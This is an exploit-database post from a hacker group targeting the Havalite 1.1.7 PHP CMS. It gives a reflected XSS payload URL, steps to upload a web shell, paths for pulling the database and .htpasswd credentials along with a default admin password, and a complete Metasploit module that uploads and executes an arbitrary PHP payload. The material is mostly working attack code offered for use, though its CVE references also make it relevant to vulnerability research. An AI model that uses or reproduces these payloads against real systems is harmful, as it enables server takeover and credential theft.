# 0     _                   __           __       __                     1
# 1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
# 0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
# 1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
# 0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
# 1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
# 0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
# 1                  \ \____/ >> Exploit database separated by exploit   0
# 0                   \/___/          type (local, remote, DoS, etc.)    1
# 1                                                                      1
# 0  [+] Site            : 1337day.com                                   0
# 1  [+] Support e-mail  : submit[at]1337day.com                         1
# 0                                                                      0
# 1               #########################################              1
# 0               I&#039;m KedAns-Dz member from Inj3ct0r Team                1
# 1               #########################################              0
# 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
 
###
# Title : Havalite v1.1.7 Mutiple Vulnerabilities
# Author : KedAns-Dz
# E-mail : ked-h (@hotmail.com / @1337day.com)
# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
# Web Site : www.1337day.com .net .org
# FaCeb0ok : http://fb.me/Inj3ct0rK3d
# Friendly Sites : www.r00tw0rm.com * www.exploit-id.com
# Platform/CatID : php - remote
# Type : php - proof of concept - metasploit
# Tested on : Windows7 , Linux SUSE v.11
# Download : [http://havalite.com/?p=15]
###
 
# <3 <3 Greetings t0 Palestine <3 <3
# Greetings To BarbarOS-Dz in the jail x_x ! F-ck HaCking, Lov3 Explo8ting

#### Exploit & Proof of concept ####>>
#
###[ POC-1 : XSS Exploit ] ==>
#
# [+] http://127.0.0.1/havalite/hava_user.php?userId=%22%3E%3Ciframe%20src=a%20onload=alert%28%22KedAns%22%29%20%3C
#
###[ POC-2 : Shell Upload ] ==>
#
# Go to: http://127.0.0.1/hava_upload.php
# Upload : KedAns_Sh3ll.php
# Shell Access : http://127.0.0.1/tmp/files/KedAns_Sh3ll.php
# 
###[ POC-3 : Full Config Disclosure ] ==>
#
# [+] After upload your shell dowload /data/havalite.db3
# line 16 : "admine10adc3949ba59abbe56e057f20f883e0ked-h@hotmail.comg6mb11ootsupjifmhphttp://127.0.0.1/havalite"
#
# [+] Or get /data/.htpasswd and get adm:pwd => "admin:123456"
#
###

###[ File/Shell Upload with Metasploit ] ==>

require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
Rank = GreatRanking
 
include Msf::Exploit::Remote::HttpClient
 
def initialize(info={})
super(update_info(info,
&#039;Name&#039;           => "Havalite v1.1.0->1.1.7 File Upload and Command Execution",
&#039;Description&#039;    => %q{
This module exploits a Multiple cross-site request forgery (CSRF) vulnerabilities
in hava_upload.php in Havalite 1.1.7 allow remote attackers can upload file.
},
&#039;License&#039;        => MSF_LICENSE,
&#039;Author&#039;         =>
[
&#039;KedAns-Dz <ked-h[at]1337day.com>&#039;, # Discovery PoC ,and Metasploit module
],
&#039;References&#039;     =>
[
[&#039;CVE&#039;, &#039;2012-5892&#039;,&#039;2012-5893&#039;,&#039;2012-5894&#039;],
[&#039;OSVDB&#039;, &#039;80770&#039;,&#039;80769&#039;,&#039;80768&#039;],
[&#039;URL&#039;, &#039;http://1337day.com/exploit/description/17877&#039;], # 1337ID-17877
[&#039;URL&#039;, &#039;http://packetstormsecurity.org/files/111358/Havalite-CMS-Shell-Upload-SQL-Injection-Disclosure.html&#039;] # PS-SEC-111358
],
&#039;Payload&#039;        =>
{
&#039;BadChars&#039; => "\x00"
},
&#039;DefaultOptions&#039;  =>
{
&#039;ExitFunction&#039; => "none"
},
&#039;Platform&#039;       => [&#039;php&#039;],
&#039;Arch&#039;           => ARCH_PHP,
&#039;Targets&#039;        =>
[
[&#039;Havalite v1.1.7&#039;, {}]
],
&#039;Privileged&#039;     => false,
&#039;DisclosureDate&#039; => "Dec 10 2012",
&#039;DefaultTarget&#039;  => 0))
 
register_options(
[
OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to Havelite&#039;, &#039;/havelite&#039;])
], self.class)
end
 
def check
uri = target_uri.path
uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
res = send_request_cgi({
&#039;method&#039; => &#039;GET&#039;,
&#039;uri&#039;    => "#{uri}hava_upload.php"
})
 
if res and res.code == 200 and res.body.empty?
return Exploit::CheckCode::Detected
else
return Exploit::CheckCode::Safe
end
end
 
def exploit
uri = target_uri.path
uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
 
peer = "#{rhost}:#{rport}"
payload_name = Rex::Text.rand_text_alpha(rand(5) + 5) + &#039;.php&#039;
 
post_data = "--1337day\r\n"
post_data << "Content-Disposition: form-data; name=\"Filedata\"; filename=\"#{payload_name}\"\r\n\r\n"
post_data << "Content-Type : text/html;\r\n"
post_data << "<?php "
post_data << payload.encoded
post_data << " ?>\r\n"
post_data << "--1337day\r\n"
 
print_status("#{peer} - Sending PHP payload (#{payload_name})")
res = send_request_cgi({
&#039;method&#039; => &#039;POST&#039;,
&#039;uri&#039;    => "#{uri}hava_upload.php",
&#039;ctype&#039;  => &#039;multipart/form-data; boundary=1337day&#039;,
&#039;data&#039;   => post_data
})
 
if not res or res.code != 200 or res.body !~ /#{payload_name}/
print_error("#{peer} - I don&#039;t think the file was uploaded !")
return
end
 
print_status("#{peer} - Executing PHP payload (#{payload_name})")
# Execute our payload
res = send_request_cgi({
&#039;method&#039; => &#039;GET&#039;,
&#039;uri&#039;    => "#{uri}tmp/files/#{payload_name}"
})
 
if res and res.code != 200
print_status("#{peer} - Server returns #{res.code.to_s}")
end
end
 
#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]===============================================
# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > | Indoushka , Caddy-Dz , Kalashinkov3 , Mennouchi.Islem
# Jago-dz , Over-X , Kha&miX , Ev!LsCr!pT_Dz, KinG Of PiraTeS, TrOoN, T0xic, Chevr0sky, Black-ID, Barbaros-DZ,
# +> Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (1337day.com) * CrosS (r00tw0rm.com)
# Inj3ct0r Members 31337 : KedAns ^^ * KnocKout * SeeMe * Kalashinkov3 * ZoRLu * anT!-Tr0J4n * Angel Injection
# NuxbieCyber (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * xDZx * HD Moore * YMCMB ..all
# Exploit-ID Team : jos_ali_joe + kaMtiEz + r3m1ck (exploit-id.com) * Milw0rm * KeyStr0ke * JF * L3b-r1Z * HMD
# packetstormsecurity.org * metasploit.com * r00tw0rm.com * OWASP Dz * Dis9-UE * All Security and Exploits Webs
#============================================================================================================

